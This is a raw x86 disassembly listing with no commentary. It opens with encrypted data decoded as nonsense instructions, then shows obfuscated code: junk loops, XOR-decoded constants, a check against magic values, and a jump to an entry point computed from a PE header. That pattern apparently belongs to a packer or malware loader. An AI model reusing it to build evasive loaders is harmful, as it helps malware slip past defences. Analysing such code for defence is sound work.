  40d66a:	(bad)  [ecx-0x24a258b7]
  40d670:	ret    0xc031
  40d673:	lock std 
  40d675:	push   esp
  40d676:	dec    esi
  40d677:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d678:	imul   eax,DWORD PTR [ebx],0x4c
  40d67b:	add    ebx,DWORD PTR [edi-0x33]
  40d67e:	cmp    ebp,DWORD PTR [ecx-0x7c3628e7]
  40d684:	je     0x40d675
  40d686:	in     al,dx
  40d687:	or     DWORD PTR [esi-0x436f91e0],ebp
  40d68d:	push   es
  40d68e:	leave  
  40d68f:	lea    ebx,[esi-0x6b]
  40d692:	push   cs
  40d693:	xor    eax,0x82715c68
  40d698:	add    DWORD PTR [ebx-0x45],eax
  40d69b:	aas    
  40d69c:	daa    
  40d69d:	addr16 adc al,0x5b
  40d6a0:	sub    BYTE PTR [eax+0x72],cl
  40d6a3:	sahf   
  40d6a4:	retf   0xce57
  40d6a7:	sbb    BYTE PTR [bx+0x67b2],bl
  40d6ac:	aad    0x7f
  40d6ae:	add    dl,bh
  40d6b0:	dec    ebx
  40d6b1:	and    ebp,esp
  40d6b3:	sbb    BYTE PTR [ebx+0x7120125b],0xe2
  40d6ba:	ss inc eax
  40d6bc:	mov    edi,0x1a538a1b
  40d6c1:	or     bh,dh
  40d6c3:	repz test al,0xba
  40d6c6:	push   cs
  40d6c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d6c8:	fwait
  40d6c9:	popf   
  40d6ca:	scas   eax,DWORD PTR es:[edi]
  40d6cb:	fucom  st(2)
  40d6cd:	mov    ebx,0x36d08d48
  40d6d2:	dec    DWORD PTR [esi-0x3c99a685]
  40d6d8:	push   cs
  40d6d9:	lahf   
  40d6da:	push   eax
  40d6db:	scas   al,BYTE PTR es:[edi]
  40d6dc:	mov    DWORD PTR [edi+0x3e],ebx
  40d6df:	and    esp,eax
  40d6e1:	repz imul bx,WORD PTR [eax+0x6d],0xfffa
  40d6e7:	scas   eax,DWORD PTR es:[edi]
  40d6e8:	and    al,0xf2
  40d6ea:	loop   0x40d6f9
  40d6ec:	cmc    
  40d6ed:	pop    ds
  40d6ee:	popa   
  40d6ef:	pop    ebp
  40d6f0:	leave  
  40d6f1:	push   0xffffffe1
  40d6f3:	inc    eax
  40d6f4:	sub    BYTE PTR [ecx-0x4198ac54],dh
  40d6fa:	push   cs
  40d6fb:	mov    ebx,0x5f9ba838
  40d700:	xchg   ebx,eax
  40d701:	jmp    0x40d781
  40d703:	inc    edx
  40d704:	inc    esi
  40d705:	sbb    BYTE PTR [edi],0x1c
  40d708:	mov    dh,0x7f
  40d70a:	popa   
  40d70b:	test   BYTE PTR [ebp+0x6de73e3f],dh
  40d711:	and    eax,0x3afa8199
  40d716:	push   esi
  40d717:	pop    edi
  40d718:	or     al,0xa5
  40d71a:	bound  ecx,QWORD PTR [esi-0x726bf11c]
  40d720:	add    BYTE PTR [edx+0x3b],ah
  40d723:	xchg   DWORD PTR [edx+0x3f],eax
  40d726:	or     BYTE PTR [edx+0x48bbbb4b],0x56
  40d72d:	cmp    dl,ch
  40d72f:	cmp    esp,eax
  40d731:	iret   
  40d732:	push   ebp
  40d733:	test   DWORD PTR [ebp+0x32],0x4951c727
  40d73a:	push   0xc434a953
  40d73f:	sbb    DWORD PTR [ebx+0x69696ac],0xffffff9b
  40d746:	cmp    BYTE PTR [ebx],ah
  40d748:	gs push eax
  40d74a:	pop    edx
  40d74b:	cmp    al,cl
  40d74d:	mov    dl,0x31
  40d74f:	nop
  40d750:	cli    
  40d751:	(bad)  
  40d752:	push   ss
  40d753:	mov    esi,0x9fb04b0d
  40d758:	jl     0x40d734
  40d75a:	shr    BYTE PTR [ecx+0x55eb7a1e],0x8b
  40d761:	or     DWORD PTR [edi+0x63],esp
  40d764:	push   ebx
  40d765:	add    dl,BYTE PTR [edi-0xa]
  40d768:	test   eax,0xe5163f55
  40d76d:	rcr    DWORD PTR [esi-0x9],cl
  40d770:	push   edi
  40d771:	cwde   
  40d772:	sahf   
  40d773:	popa   
  40d774:	xor    eax,0x6b62e43a
  40d779:	pop    esp
  40d77a:	jbe    0x40d7ec
  40d77c:	daa    
  40d77d:	or     eax,0x97dde1be
  40d782:	and    DWORD PTR fs:[edx-0xd],edi
  40d786:	jns    0x40d7b2
  40d788:	dec    ebp
  40d789:	push   ebx
  40d78a:	push   0x16
  40d78c:	push   cs
  40d78d:	scas   eax,DWORD PTR es:[edi]
  40d78e:	adc    BYTE PTR [edi+0x3a1df6bc],dh
  40d794:	fnsave [ecx]
  40d796:	lds    ebx,FWORD PTR [ebx]
  40d798:	push   ss
  40d799:	xchg   ebp,eax
  40d79a:	int    0x6c
  40d79c:	out    dx,eax
  40d79d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d79e:	rcr    ch,0xa0
  40d7a1:	sub    dl,al
  40d7a3:	std    
  40d7a4:	outs   dx,DWORD PTR ds:[esi]
  40d7a5:	clc    
  40d7a6:	popf   
  40d7a7:	sub    al,0x84
  40d7a9:	loopne 0x40d769
  40d7ab:	stos   DWORD PTR es:[edi],eax
  40d7ac:	jmp    0x40d755
  40d7ae:	mov    ds:0x49768800,eax
  40d7b3:	sbb    dh,bh
  40d7b5:	cmc    
  40d7b6:	test   al,0x1c
  40d7b8:	mov    DWORD PTR [ecx+0x5fb07af8],ebx
  40d7be:	bound  edx,QWORD PTR [ecx+0xd6747a9]
  40d7c4:	xchg   edi,eax
  40d7c5:	cs aad 0x89
  40d7c8:	test   al,0xd8
  40d7ca:	xchg   DWORD PTR [eax],edx
  40d7cc:	add    dl,BYTE PTR [ebp-0x29dcb6a5]
  40d7d2:	mov    esp,0x4e3eaa7f
  40d7d7:	push   cs
  40d7d8:	mov    DWORD PTR [ebx],eax
  40d7da:	cdq    
  40d7db:	and    BYTE PTR [ebp-0x65],ah
  40d7de:	push   edi
  40d7df:	inc    edi
  40d7e0:	popf   
  40d7e1:	mov    bl,0x10
  40d7e3:	mov    dl,0xea
  40d7e5:	sbb    BYTE PTR [edi],bh
  40d7e7:	jbe    0x40d7bd
  40d7e9:	pop    ebx
  40d7ea:	scas   al,BYTE PTR es:[edi]
  40d7eb:	mov    al,ds:0x2240dac8
  40d7f0:	pop    edx
  40d7f1:	jnp    0x40d804
  40d7f3:	dec    eax
  40d7f4:	(bad)  
  40d7f5:	fisub  DWORD PTR [ebp+0x1d8389f]
  40d7fb:	push   edx
  40d7fc:	loop   0x40d805
  40d7fe:	stos   DWORD PTR es:[edi],eax
  40d7ff:	sub    dh,BYTE PTR [edx+0x64fb3480]
  40d805:	mov    ?,WORD PTR [eax]
  40d807:	dec    eax
  40d808:	inc    esi
  40d809:	cmp    esp,DWORD PTR [edi]
  40d80b:	hlt    
  40d80c:	mov    ebp,0x54f7e807
  40d811:	call   0xe69dfa16
  40d816:	lahf   
  40d817:	jno    0x40d7dc
  40d819:	add    DWORD PTR [eax],0xffffffe8
  40d81c:	jno    0x40d874
  40d81e:	dec    esi
  40d81f:	jne    0x40d814
  40d821:	scas   al,BYTE PTR es:[edi]
  40d822:	mov    al,ds:0x5702cb83
  40d827:	repnz fstp TBYTE PTR [edx+edx*4]
  40d82b:	sar    edx,1
  40d82d:	pop    eax
  40d82e:	daa    
  40d82f:	out    dx,eax
  40d830:	(bad)  
  40d831:	mov    esi,0x8aa6c6c3
  40d836:	popf   
  40d837:	das    
  40d838:	or     bl,cl
  40d83a:	mov    esp,0x4019e003
  40d83f:	data16 xor al,ah
  40d842:	cdq    
  40d843:	push   0x6c07145a
  40d848:	ja     0x40d7f6
  40d84a:	cmp    ecx,DWORD PTR [eax*2-0x43f30488]
  40d851:	mov    ds:0x9f626e0e,al
  40d856:	loope  0x40d80a
  40d858:	push   ss
  40d859:	jecxz  0x40d8a8
  40d85b:	cmp    eax,0xce15b398
  40d860:	mov    ds:0x29f4331b,al
  40d865:	push   esi
  40d866:	and    DWORD PTR [edi-0x24b123b8],esp
  40d86c:	mov    al,0x3c
  40d86e:	(bad)  
  40d86f:	sbb    BYTE PTR [ebp-0xf82fca3],al
  40d875:	mov    edx,DWORD PTR [ebp-0x20]
  40d878:	mov    ebx,DWORD PTR [ebp-0x8]
  40d87b:	xor    edx,eax
  40d87d:	add    edx,ecx
  40d87f:	imul   edx,ebx
  40d882:	cmp    edx,edi
  40d884:	jbe    0x40a7b9
  40d88a:	pop    ebx
  40d88b:	pop    edi
  40d88c:	leave  
  40d88d:	ret    0x8
  40d890:	push   ebp
  40d891:	mov    ebp,esp
  40d893:	sub    esp,0x70
  40d896:	or     DWORD PTR ds:0x42fce9,0x42e11c
  40d8a0:	push   0x41b2bc
  40d8a5:	sbb    DWORD PTR ds:0x42fd76,0x42fcf1
  40d8af:	call   DWORD PTR ds:0x42e497
  40d8b5:	and    DWORD PTR ds:0x42fcfd,0x42fd82
  40d8bf:	test   ax,ax
  40d8c2:	jne    0x40d8d9
  40d8c8:	xor    eax,eax
  40d8ca:	mov    DWORD PTR ds:0x42e134,0x1bc4
  40d8d4:	jmp    0x40e0cc
  40d8d9:	adc    DWORD PTR ds:0x42e124,0x42fce9
  40d8e3:	push   0x41b2d4
  40d8e8:	call   DWORD PTR ds:0x42e50f
  40d8ee:	sbb    DWORD PTR ds:0x42e6fb,0x42fd72
  40d8f8:	test   ax,ax
  40d8fb:	mov    DWORD PTR ds:0x42fcf5,0x74f8
  40d905:	je     0x40d8c8
  40d90b:	call   DWORD PTR ds:0x42e457
  40d911:	cdq    
  40d912:	mov    DWORD PTR ds:0x42fd05,0x1251
  40d91c:	cmp    eax,0x45767589
  40d921:	jne    0x40d98c
  40d927:	mov    DWORD PTR ds:0x42fd76,0x294f
  40d931:	cmp    edx,0x87676567
  40d937:	jne    0x40d98c
  40d93d:	push   0x0
  40d93f:	push   0x0
  40d941:	adc    DWORD PTR ds:0x42e124,0x42e6f7
  40d94b:	push   0x9879874
  40d950:	push   0x45
  40d952:	push   0x1
  40d954:	push   0x545
  40d959:	push   0x87686787
  40d95e:	xor    DWORD PTR ds:0x42fd6e,0x75b9
  40d968:	push   0x9879877
  40d96d:	or     DWORD PTR ds:0x42fced,0x42e118
  40d977:	call   DWORD PTR ds:0x42e49f
  40d97d:	mov    DWORD PTR ds:0x42e11c,0x1611
  40d987:	jmp    0x40e0cc
  40d98c:	push   0x41b2e0
  40d991:	call   DWORD PTR ds:0x42e38f
  40d997:	test   eax,eax
  40d999:	je     0x40d9cd
  40d99f:	sbb    DWORD PTR ds:0x42fd01,0x42e134
  40d9a9:	push   0x41b314
  40d9ae:	and    DWORD PTR ds:0x42fced,0x2b9d
  40d9b8:	call   DWORD PTR ds:0x42e2fb
  40d9be:	mov    DWORD PTR ds:0x42fd8a,0x47ee
  40d9c8:	jmp    0x40e0cc
  40d9cd:	push   ebx
  40d9ce:	mov    ebx,0xf89c8531
  40d9d3:	add    DWORD PTR ds:0x42e118,ebx
  40d9d9:	mov    DWORD PTR [ebp-0x8],ebx
  40d9dc:	and    DWORD PTR ds:0x42fcf5,0x0
  40d9e6:	mov    ecx,DWORD PTR ds:0x42fcf5
  40d9ec:	inc    ecx
  40d9ed:	mov    DWORD PTR ds:0x42fcf5,ecx
  40d9f3:	cmp    DWORD PTR ds:0x42fcf5,0xf
  40d9fa:	jne    0x40da20
  40da00:	push   0x1990
  40da05:	push   0x7f06
  40da0a:	push   0x857e
  40da0f:	push   DWORD PTR [ebp-0x28]
  40da12:	push   0x42e18d
  40da17:	push   DWORD PTR [ebp-0x10]
  40da1a:	call   DWORD PTR ds:0x42e54f
  40da20:	cmp    DWORD PTR ds:0x42fcf5,0xe
  40da27:	jne    0x40da3a
  40da2d:	mov    ecx,DWORD PTR ds:0x42fcf5
  40da33:	inc    ecx
  40da34:	mov    DWORD PTR ds:0x42fcf5,ecx
  40da3a:	cmp    DWORD PTR ds:0x42fcf5,0x1d
  40da41:	jb     0x40d9e6
  40da47:	add    DWORD PTR ds:0x42e703,0x406c
  40da51:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  40da58:	lea    eax,[ebp-0x18]
  40da5b:	adc    DWORD PTR ds:0x42e6f3,ecx
  40da61:	mov    DWORD PTR [ebp-0x14],eax
  40da64:	adc    DWORD PTR ds:0x42fcd1,0x42e11c
  40da6e:	lea    eax,[ebp-0x1c]
  40da71:	mov    DWORD PTR ds:0x42fd05,0x1a
  40da7b:	cmp    DWORD PTR ds:0x42fd05,0x0
  40da82:	je     0x40dbc3
  40da88:	cmp    DWORD PTR ds:0x42fd05,0x1c
  40da8f:	jne    0x40daa1
  40da95:	push   DWORD PTR [ebp-0x1c]
  40da98:	push   DWORD PTR [ebp-0x14]
  40da9b:	call   DWORD PTR ds:0x42e553
  40daa1:	xor    ecx,ecx
  40daa3:	add    ecx,DWORD PTR ds:0x42fd05
  40daa9:	dec    ecx
  40daaa:	mov    DWORD PTR ds:0x42fd05,ecx
  40dab0:	jmp    0x40da7b
  40dab5:	mov    DWORD PTR ds:0x42e707,0x1d
  40dabf:	cmp    DWORD PTR ds:0x42e707,0x0
  40dac6:	je     0x40dbc3
  40dacc:	cmp    DWORD PTR ds:0x42e707,0xf
  40dad3:	jne    0x40dae4
  40dad9:	push   0x1303
  40dade:	call   DWORD PTR ds:0x42e463
  40dae4:	cmp    DWORD PTR ds:0x42e707,0x10
  40daeb:	jne    0x40dafe
  40daf1:	mov    ecx,DWORD PTR ds:0x42e707
  40daf7:	dec    ecx
  40daf8:	mov    DWORD PTR ds:0x42e707,ecx
  40dafe:	mov    ecx,DWORD PTR ds:0x42e707
  40db04:	dec    ecx
  40db05:	mov    DWORD PTR ds:0x42e707,ecx
  40db0b:	jmp    0x40dabf
  40db10:	mov    DWORD PTR ds:0x42e6ff,0x14
  40db1a:	cmp    DWORD PTR ds:0x42e6ff,0x0
  40db21:	je     0x40dbc3
  40db27:	cmp    DWORD PTR ds:0x42e6ff,0x2
  40db2e:	jne    0x40db41
  40db34:	push   0x1
  40db36:	push   0x279d
  40db3b:	call   DWORD PTR ds:0x42e557
  40db41:	cmp    DWORD PTR ds:0x42e6ff,0x3
  40db48:	jne    0x40db5b
  40db4e:	mov    ecx,DWORD PTR ds:0x42e6ff
  40db54:	dec    ecx
  40db55:	mov    DWORD PTR ds:0x42e6ff,ecx
  40db5b:	mov    ecx,DWORD PTR ds:0x42e6ff
  40db61:	dec    ecx
  40db62:	mov    DWORD PTR ds:0x42e6ff,ecx
  40db68:	jmp    0x40db1a
  40db6d:	mov    DWORD PTR ds:0x42fd76,0x1a
  40db77:	cmp    DWORD PTR ds:0x42fd76,0x0
  40db7e:	je     0x40dbc3
  40db84:	cmp    DWORD PTR ds:0x42fd76,0x6
  40db8b:	jne    0x40db97
  40db91:	call   DWORD PTR ds:0x42e55b
  40db97:	cmp    DWORD PTR ds:0x42fd76,0x7
  40db9e:	jne    0x40dbb1
  40dba4:	mov    ecx,DWORD PTR ds:0x42fd76
  40dbaa:	dec    ecx
  40dbab:	mov    DWORD PTR ds:0x42fd76,ecx
  40dbb1:	mov    ecx,DWORD PTR ds:0x42fd76
  40dbb7:	dec    ecx
  40dbb8:	mov    DWORD PTR ds:0x42fd76,ecx
  40dbbe:	jmp    0x40db77
  40dbc3:	mov    DWORD PTR [ebp-0xc],eax
  40dbc6:	or     ecx,eax
  40dbc8:	mov    eax,ds:0x41b1a8
  40dbcd:	or     DWORD PTR ds:0x42e707,edx
  40dbd3:	mov    eax,DWORD PTR [eax+0x1c8]
  40dbd9:	or     DWORD PTR ds:0x42e713,edx
  40dbdf:	mov    eax,DWORD PTR [eax]
  40dbe1:	mov    ecx,DWORD PTR [ebp-0xc]
  40dbe4:	push   esi
  40dbe5:	mov    esi,0x7510855
  40dbea:	sub    DWORD PTR ds:0x42fd7e,0x662
  40dbf4:	xor    eax,esi
  40dbf6:	push   edi
  40dbf7:	and    DWORD PTR ds:0x42fce5,0x0
  40dc01:	jmp    0x40dc13
  40dc06:	mov    edi,DWORD PTR ds:0x42fce5
  40dc0c:	inc    edi
  40dc0d:	mov    DWORD PTR ds:0x42fce5,edi
  40dc13:	cmp    DWORD PTR ds:0x42fce5,0x1d
  40dc1a:	jae    0x40dc4a
  40dc20:	cmp    DWORD PTR ds:0x42fce5,0x2b
  40dc27:	jne    0x40dc45
  40dc2d:	push   0x3dd1
  40dc32:	push   DWORD PTR [ebp-0x24]
  40dc35:	push   0x2bbe
  40dc3a:	push   0x75d2
  40dc3f:	call   DWORD PTR ds:0x42e467
  40dc45:	jmp    0x40dc06
  40dc4a:	mov    edi,0x32729c
  40dc4f:	add    eax,edi
  40dc51:	mov    DWORD PTR [ecx],eax
  40dc53:	mov    DWORD PTR ds:0x42e128,edx
  40dc59:	mov    eax,ds:0x41b418
  40dc5e:	mov    DWORD PTR ds:0x42fd01,0x477b
  40dc68:	cmp    eax,0x23c13046
  40dc6d:	mov    eax,DWORD PTR [ebp-0x4]
  40dc70:	mov    DWORD PTR ds:0x42fd09,0x45bc
  40dc7a:	je     0x40dd06
  40dc80:	mov    DWORD PTR ds:0x42e6f7,0x1c
  40dc8a:	cmp    DWORD PTR ds:0x42e6f7,0x0
  40dc91:	je     0x40dcd6
  40dc97:	cmp    DWORD PTR ds:0x42e6f7,0xa
  40dc9e:	jne    0x40dcaa
  40dca4:	call   DWORD PTR ds:0x42e46b
  40dcaa:	cmp    DWORD PTR ds:0x42e6f7,0xb
  40dcb1:	jne    0x40dcc4
  40dcb7:	mov    ecx,DWORD PTR ds:0x42e6f7
  40dcbd:	dec    ecx
  40dcbe:	mov    DWORD PTR ds:0x42e6f7,ecx
  40dcc4:	mov    ecx,DWORD PTR ds:0x42e6f7
  40dcca:	dec    ecx
  40dccb:	mov    DWORD PTR ds:0x42e6f7,ecx
  40dcd1:	jmp    0x40dc8a
  40dcd6:	mov    ecx,DWORD PTR [ebp-0x8]
  40dcd9:	sbb    DWORD PTR ds:0x42fd82,0x42e12c
  40dce3:	xor    eax,esi
  40dce5:	and    DWORD PTR ds:0x42fd82,0x42e124
  40dcef:	add    eax,edi
  40dcf1:	imul   eax,ecx
  40dcf4:	mov    DWORD PTR [ebp-0x8],eax
  40dcf7:	mov    DWORD PTR ds:0x42fcd1,0x365a
  40dd01:	jmp    0x40ddd3
  40dd06:	sbb    DWORD PTR ds:0x42e118,edx
  40dd0c:	xor    eax,esi
  40dd0e:	add    eax,edi
  40dd10:	and    DWORD PTR ds:0x42fd72,0x0
  40dd1a:	jmp    0x40dd2c
  40dd1f:	mov    ecx,DWORD PTR ds:0x42fd72
  40dd25:	inc    ecx
  40dd26:	mov    DWORD PTR ds:0x42fd72,ecx
  40dd2c:	cmp    DWORD PTR ds:0x42fd72,0x12
  40dd33:	jae    0x40dd6e
  40dd39:	cmp    DWORD PTR ds:0x42fd72,0x6
  40dd40:	jne    0x40dd4f
  40dd46:	push   DWORD PTR [ebp-0x24]
  40dd49:	call   DWORD PTR ds:0x42e46f
  40dd4f:	cmp    DWORD PTR ds:0x42fd72,0x5
  40dd56:	jne    0x40dd69
  40dd5c:	mov    ecx,DWORD PTR ds:0x42fd72
  40dd62:	inc    ecx
  40dd63:	mov    DWORD PTR ds:0x42fd72,ecx
  40dd69:	jmp    0x40dd1f
  40dd6e:	mov    ds:0x41b2b8,eax
  40dd73:	mov    eax,DWORD PTR [ebp-0x8]
  40dd76:	or     DWORD PTR ds:0x42fd0d,edx
  40dd7c:	xor    eax,esi
  40dd7e:	sub    DWORD PTR ds:0x42e130,edx
  40dd84:	add    eax,edi
  40dd86:	mov    ds:0x41b418,eax
  40dd8b:	mov    eax,DWORD PTR [ebp-0x4]
  40dd8e:	mov    ecx,DWORD PTR ds:0x41b2b8
  40dd94:	xor    eax,esi
  40dd96:	add    eax,edi
  40dd98:	mov    DWORD PTR ds:0x42fd09,0x3e5c
  40dda2:	cmp    ecx,eax
  40dda4:	jne    0x40ddd3
  40ddaa:	sub    DWORD PTR ds:0x42fd86,0x42fcfd
  40ddb4:	push   DWORD PTR [ebp-0x4]
  40ddb7:	and    DWORD PTR ds:0x42e6f3,0x4c1c
  40ddc1:	push   DWORD PTR [ebp-0x8]
  40ddc4:	adc    DWORD PTR ds:0x42e6ff,0x42fd8a
  40ddce:	call   0x40e0d0
  40ddd3:	mov    eax,ds:0x41b1a8
  40ddd8:	sbb    edx,DWORD PTR ds:0x42e6eb
  40ddde:	mov    eax,DWORD PTR [eax+0x18c]
  40dde4:	and    DWORD PTR ds:0x42fce5,0x0
  40ddee:	mov    edx,DWORD PTR ds:0x42fce5
  40ddf4:	inc    edx
  40ddf5:	mov    DWORD PTR ds:0x42fce5,edx
  40ddfb:	cmp    DWORD PTR ds:0x42fce5,0x18
  40de02:	jne    0x40de18
  40de08:	push   0x42fd09
  40de0d:	push   0x42e26d
  40de12:	call   DWORD PTR ds:0x42e473
  40de18:	cmp    DWORD PTR ds:0x42fce5,0x13
  40de1f:	jb     0x40ddee
  40de25:	mov    ecx,DWORD PTR ds:0x42fd21
  40de2b:	mov    ecx,DWORD PTR [ecx]
  40de2d:	or     DWORD PTR ds:0x42fcfd,ecx
  40de33:	mov    eax,DWORD PTR [eax]
  40de35:	mov    DWORD PTR ds:0x42fcf5,0x11
  40de3f:	cmp    DWORD PTR ds:0x42fcf5,0x0
  40de46:	je     0x40de77
  40de4c:	cmp    DWORD PTR ds:0x42fcf5,0x19
  40de53:	jne    0x40de65
  40de59:	push   DWORD PTR [ebp-0xc]
  40de5c:	push   DWORD PTR [ebp-0x10]
  40de5f:	call   DWORD PTR ds:0x42e55f
  40de65:	mov    edx,DWORD PTR ds:0x42fcf5
  40de6b:	dec    edx
  40de6c:	mov    DWORD PTR ds:0x42fcf5,edx
  40de72:	jmp    0x40de3f
  40de77:	mov    DWORD PTR [ebp-0x20],eax
  40de7a:	mov    eax,0xf89c853d
  40de7f:	mov    DWORD PTR [ebp-0x24],eax
  40de82:	mov    DWORD PTR [ebp-0x24],eax
  40de85:	mov    DWORD PTR [ebp-0x24],eax
  40de88:	mov    DWORD PTR [ebp-0xc],ebx
  40de8b:	mov    DWORD PTR [ebp-0x24],eax
  40de8e:	mov    DWORD PTR [ebp-0x24],0xf89c8539
  40de95:	mov    ebx,DWORD PTR [ebp-0x8]
  40de98:	mov    ecx,DWORD PTR [ebp-0x4]
  40de9b:	mov    edx,DWORD PTR [ebp-0x4]
  40de9e:	xor    edx,esi
  40dea0:	xor    ecx,esi
  40dea2:	add    ecx,edx
  40dea4:	mov    edx,DWORD PTR [ebp-0x4]
  40dea7:	xor    ebx,esi
  40dea9:	xor    edx,esi
  40deab:	add    ebx,edi
  40dead:	lea    ecx,[ecx+edx*1+0x9757d4]
  40deb4:	cmp    ebx,ecx
  40deb6:	ja     0x40df17
  40debc:	mov    eax,DWORD PTR [ebp-0x4]
  40debf:	xor    eax,esi
  40dec1:	lea    eax,[eax+ebx*1+0x32729c]
  40dec8:	push   eax
  40dec9:	mov    eax,DWORD PTR [ebp-0xc]
  40decc:	xor    eax,esi
  40dece:	lea    eax,[ebp+eax*1+0x3272a4]
  40ded5:	push   eax
  40ded6:	mov    eax,ds:0x41b1a8
  40dedb:	push   DWORD PTR [eax+0x1bc]
  40dee1:	call   0x402976
  40dee6:	mov    eax,DWORD PTR [ebp-0x4]
  40dee9:	xor    eax,esi
  40deeb:	lea    ebx,[ebx+eax*1+0x32729c]
  40def2:	mov    eax,DWORD PTR [ebp-0x4]
  40def5:	mov    ecx,DWORD PTR [ebp-0x4]
  40def8:	xor    ecx,esi
  40defa:	xor    eax,esi
  40defc:	add    eax,ecx
  40defe:	mov    ecx,DWORD PTR [ebp-0x4]
  40df01:	xor    ecx,esi
  40df03:	lea    eax,[eax+ecx*1+0x9757d4]
  40df0a:	cmp    ebx,eax
  40df0c:	jbe    0x40debc
  40df12:	mov    eax,0xf89c853d
  40df17:	mov    ecx,DWORD PTR [ebp+0xc]
  40df1a:	mov    DWORD PTR ds:0x41b02c,ecx
  40df20:	mov    ecx,DWORD PTR [ebp+0x10]
  40df23:	mov    DWORD PTR ds:0x41b280,ecx
  40df29:	mov    ecx,DWORD PTR ds:0x41b02c
  40df2f:	mov    edx,DWORD PTR [ebp-0x14]
  40df32:	sub    ecx,edi
  40df34:	xor    ecx,esi
  40df36:	mov    DWORD PTR [edx],ecx
  40df38:	mov    ecx,DWORD PTR [ebp-0x18]
  40df3b:	cmp    ecx,0xf89c8530
  40df41:	je     0x40df9e
  40df47:	mov    ecx,DWORD PTR [ebp-0x8]
  40df4a:	mov    edx,DWORD PTR [ebp-0x1c]
  40df4d:	xor    ecx,esi
  40df4f:	add    ecx,edi
  40df51:	cmp    ecx,edx
  40df53:	je     0x40df9e
  40df59:	mov    eax,ds:0x41b1a8
  40df5e:	mov    eax,DWORD PTR [eax+0x194]
  40df64:	mov    ecx,DWORD PTR [eax]
  40df66:	mov    eax,DWORD PTR [ecx+0x3c]
  40df69:	push   DWORD PTR ds:0x41b280
  40df6f:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  40df73:	push   DWORD PTR ds:0x41b02c
  40df79:	add    eax,ecx
  40df7b:	mov    ecx,DWORD PTR ds:0x41b1a8
  40df81:	mov    ecx,DWORD PTR [ecx+0x194]
  40df87:	push   DWORD PTR [ecx]
  40df89:	call   eax
  40df8b:	mov    ecx,DWORD PTR ds:0x41b1a8
  40df91:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40df97:	mov    DWORD PTR [ecx],eax
  40df99:	jmp    0x40e0ae
  40df9e:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfa1:	mov    edx,DWORD PTR [ebp-0x20]
  40dfa4:	xor    ecx,esi
  40dfa6:	add    ecx,edi
  40dfa8:	cmp    ecx,edx
  40dfaa:	jne    0x40e091
  40dfb0:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfb3:	xor    ecx,esi
  40dfb5:	add    ecx,edi
  40dfb7:	mov    DWORD PTR ds:0x41b22c,ecx
  40dfbd:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfc0:	xor    ecx,esi
  40dfc2:	add    ecx,edi
  40dfc4:	mov    DWORD PTR ds:0x41b224,ecx
  40dfca:	mov    ecx,DWORD PTR [ebp-0x4]
  40dfcd:	mov    DWORD PTR [ebp-0xc],ecx
  40dfd0:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfd3:	mov    DWORD PTR [ebp+0xc],ecx
  40dfd6:	mov    ecx,DWORD PTR [ebp+0xc]
  40dfd9:	xor    ecx,esi
  40dfdb:	add    ecx,edi
  40dfdd:	mov    DWORD PTR [ebp+0xc],ecx
  40dfe0:	mov    ecx,DWORD PTR ds:0x41b028
  40dfe6:	mov    ecx,DWORD PTR [ecx]
  40dfe8:	mov    DWORD PTR [ebp+0xc],ecx
  40dfeb:	mov    ecx,DWORD PTR ds:0x41b230
  40dff1:	mov    ecx,DWORD PTR [ecx]
  40dff3:	mov    DWORD PTR [ebp-0x14],ecx
  40dff6:	mov    DWORD PTR [ebp+0x10],0xf89c8731
  40dffd:	mov    ecx,DWORD PTR [ebp+0x10]
  40e000:	xor    ecx,esi
  40e002:	add    ecx,edi
  40e004:	mov    DWORD PTR [ebp+0x10],ecx
  40e007:	mov    ecx,DWORD PTR ds:0x41b1a8
  40e00d:	mov    DWORD PTR [ebp+0x10],ecx
  40e010:	mov    ecx,DWORD PTR [ebp+0xc]
  40e013:	mov    DWORD PTR [ebp+0xc],ecx
  40e016:	mov    ecx,DWORD PTR [ebp+0xc]
  40e019:	push   0x4
  40e01b:	pop    edx
  40e01c:	sub    edx,ecx
  40e01e:	add    edx,DWORD PTR [ebp-0x14]
  40e021:	mov    DWORD PTR [ebp-0x24],0xf89c85f1
  40e028:	mov    DWORD PTR [ebp+0x10],edx
  40e02b:	mov    DWORD PTR [ebp-0x70],eax
  40e02e:	mov    eax,DWORD PTR [ebp+0xc]
  40e031:	mov    DWORD PTR [ebp-0x6c],eax
  40e034:	mov    eax,DWORD PTR [ebp+0x10]
  40e037:	mov    DWORD PTR [ebp-0x68],eax
  40e03a:	mov    eax,DWORD PTR [ebp-0x24]
  40e03d:	xor    eax,esi
  40e03f:	add    eax,edi
  40e041:	mov    DWORD PTR [ebp-0x64],eax
  40e044:	lea    eax,[ebp-0x2c]
  40e047:	mov    DWORD PTR [ebp-0x60],eax
  40e04a:	mov    eax,DWORD PTR [ebp-0x70]
  40e04d:	xor    eax,esi
  40e04f:	add    eax,edi
  40e051:	mov    DWORD PTR [ebp-0x70],eax
  40e054:	lea    eax,[ebp-0x70]
  40e057:	push   eax
  40e058:	mov    eax,DWORD PTR [ebp-0xc]
  40e05b:	xor    eax,esi
  40e05d:	add    eax,edi
  40e05f:	push   eax
  40e060:	mov    eax,ds:0x41b1c8
  40e065:	push   0x41b11e
  40e06a:	push   DWORD PTR [eax]
  40e06c:	call   0x4120bb
  40e071:	xor    esi,esi
  40e073:	mov    eax,DWORD PTR [ebp+0x10]
  40e076:	sub    eax,esi
  40e078:	push   eax
  40e079:	mov    eax,DWORD PTR [ebp+0xc]
  40e07c:	add    eax,esi
  40e07e:	push   eax
  40e07f:	call   0x4099c9
  40e084:	inc    esi
  40e085:	cmp    esi,0x52
  40e088:	jb     0x40e073
  40e08e:	mov    eax,DWORD PTR [ebp-0xc]
  40e091:	call   0x406acb
  40e096:	lea    eax,[ebp+0x4]
  40e099:	mov    DWORD PTR [ebp-0x28],eax
  40e09c:	mov    eax,DWORD PTR [ebp-0x10]
  40e09f:	mov    eax,DWORD PTR [ebp-0x4]
  40e0a2:	push   DWORD PTR [ebp-0x8]
  40e0a5:	lea    eax,[ebp-0x28]
  40e0a8:	push   eax
  40e0a9:	call   0x410b90
  40e0ae:	mov    eax,ds:0x41b1a8
